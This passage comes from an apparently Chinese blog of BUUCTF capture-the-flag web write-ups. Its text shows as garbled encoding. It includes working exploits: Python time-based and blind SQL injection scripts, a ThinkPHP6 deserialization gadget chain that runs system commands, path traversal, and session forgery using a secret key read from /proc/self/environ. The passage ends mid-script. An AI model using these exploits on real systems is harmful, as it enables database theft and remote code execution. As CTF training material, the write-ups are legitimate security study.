</span></span><span class="line"><span class="cl">        <span class="s2">&#34;up_file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;sess&#34;</span><span class="p">,</span> <span class="n">BytesIO</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">usernames:5:&#34;admin&#34;;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;attr&#39;</span><span class="p">:</span><span class="s1">&#39;.&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;direction&#39;</span><span class="p">:</span><span class="s1">&#39;upload&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://375fb983-49c0-4074-a8e6-6c98e5206ddc.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session_id</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">usernames:5:&#34;admin&#34;;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">session_id</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæˆ‘ç”¨apifox,ä¸Šä¼ ç”¨upload</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194543059.png"
	width="1544"
	height="811"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194543059_hu13128530964778686959.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250506194543059_hu4119105761840831864.png 1024w"
	loading="lazy"
	
		alt="image-20250506194543059"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
<p>æ¥ç€ä¸Šä¼ success.txt</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194942140.png"
	width="1215"
	height="136"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194942140_hu111892829501271508.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250506194942140_hu11116934968081920548.png 1024w"
	loading="lazy"
	
		alt="image-20250506194942140"
	
	
		class="gallery-image" 
		data-flex-grow="893"
		data-flex-basis="2144px"
	
></p>
<p>ç„¶åæŠŠsessionå€¼æ”¹ä¸€ä¸‹å°±è¡Œäº†</p>
<h2 id="swpu2019web4">[SWPU2019]Web4
</h2><p>ä¸Šæ¥ç›²æ³¨å‡ºå¤‡ä»½æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#author: c1e4r</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#é¢˜ç›®åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;http://f30f0574-3492-4a09-a14f-203db6705c1a.node5.buuoj.cn:81/index.php?r=Login/Login&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#æ³¨å…¥payload</span>
</span></span><span class="line"><span class="cl">    <span class="n">payloads</span> <span class="o">=</span> <span class="s2">&#34;asd&#39;;set @a=0x</span><span class="si">{0}</span><span class="s2">;prepare ctftest from @a;execute ctftest-- -&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#æŸ¥è¯¢payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select if(ascii(substr((select flag from flag),</span><span class="si">{0}</span><span class="s2">,1))=</span><span class="si">{1}</span><span class="s2">,sleep(3),1)&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span>
</span></span><span class="line"><span class="cl">            <span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">payloads</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">str_to_hex</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">))),</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="s1">&#39;test213&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">datas</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">times</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">times</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">str_to_hex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>glzjin_wants_a_girl_friend.zip</p>
<p>å®¡è®¡æºç å‘ç°listdataè¿™ä¸ªå˜é‡å¯æ§ï¼Œuserindex.phpé‡Œé¢å¯ä»¥ä¼ å…¥img_fileè·Ÿflagè·¯å¾„å°±å¯ä»¥è¯»å–äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">index.php?r=User/Index&amp;img_file=/../flag.php
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å®‰æ´µæ¯-2019iamthinking">[å®‰æ´µæ¯ 2019]iamthinking
</h2><p>www.zipä¸‹è½½æºç </p>
<p>thinkphp6ååºåˆ—åŒ–</p>
<p>æœ€åä¸€æ­¥è¦ç”¨<code>parse_url</code>çš„æ¼æ´åŠ <code>//</code>å°±è¡Œ</p>
<p>pocå·¥å…·https://github.com/wh1t3p1g/phpggc</p>
<p>åˆ©ç”¨é“¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">think\Model --&gt; __destruct()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; save()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; updateData()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; checkAllowFields()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\Model --&gt; db()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ååŠéƒ¨åˆ†åˆ©ç”¨é“¾ï¼ˆåŒtp 5.2ååŠéƒ¨åˆ†åˆ©ç”¨é“¾)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Conversion --&gt; __toString()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Conversion --&gt; __toJson()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Conversion --&gt; __toArray()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Attribute --&gt; getAttr()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">think\model\concern\Attribute --&gt; getValue()
</span></span></code></pre></td></tr></table>
</div>
</div><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model\concern</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">trait</span> <span class="nx">Conversion</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">trait</span> <span class="nx">Attribute</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="nv">$withAttr</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;xxx&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;system&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;xxx&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;cat /flag&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">model\concern\Attribute</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">model\concern\Conversion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$lazySave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$withEvent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$exists</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$force</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$field</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$schema</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lazySave</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">withEvent</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exists</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">force</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">field</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">schema</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">use</span> <span class="nx">think\Model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span> <span class="k">extends</span> <span class="nx">Model</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$obj</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//å®šä¹‰this-&gt;dataä¸ä¸ºç©º
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span> <span class="o">=</span> <span class="nv">$obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Pivot</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Pivot</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="paseca2019honey_shop">[PASECA2019]honey_shop
</h2><p>å›¾ç‰‡æœ‰ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>è¯»å–proc/self/enviorn</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132341354.png"
	width="1870"
	height="700"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132341354_hu14708797881950797707.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250508132341354_hu5360137006694515489.png 1024w"
	loading="lazy"
	
		alt="image-20250508132341354"
	
	
		class="gallery-image" 
		data-flex-grow="267"
		data-flex-basis="641px"
	
></p>
<p>è¯»åˆ°secretkeyä¼ªé€ session</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">F5SmhLBQtsPYGpBRZxe56E0Nwk7LJ369gSI2Kl4h
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132836287.png"
	width="1457"
	height="215"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250508132836287_hu433010948157011271.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250508132836287_hu11182845493991691577.png 1024w"
	loading="lazy"
	
		alt="image-20250508132836287"
	
	
		class="gallery-image" 
		data-flex-grow="677"
		data-flex-basis="1626px"
	
></p>
<h2 id="black-watch-å…¥ç¾¤é¢˜web">[Black Watch å…¥ç¾¤é¢˜]Web
</h2><p>ç›²æ³¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#æŸ¥åº“å</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(database())),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span>    <span class="c1">#åº“åä¸ºnews</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=</span><span class="se">\&#39;</span><span class="s1">news</span><span class="se">\&#39;</span><span class="s1">)),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span> <span class="c1">#è¡¨åä¸ºadmin,contents</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#æŸ¥å­—æ®µ</span>
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=</span><span class="se">\&#39;</span><span class="s1">contents</span><span class="se">\&#39;</span><span class="s1">)),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span>   <span class="c1">#adminè¡¨é‡Œæœ‰id,username,password,is_enable</span>
</span></span><span class="line"><span class="cl">                                                                                                                                              <span class="c1"># contentsè¡¨é‡Œæœ‰id,title,content,is_enable</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#æŸ¥å­—æ®µå€¼</span>
</span></span><span class="line"><span class="cl"><span class="n">payload4</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(group_concat(password))from(admin)),</span><span class="si">{}</span><span class="s1">,1))&gt;</span><span class="si">{}</span><span class="s1">)^1&#39;</span>    <span class="c1">#åˆ†åˆ«æŸ¥usernameå’Œpassword</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span><span class="mi">28</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span><span class="mi">137</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
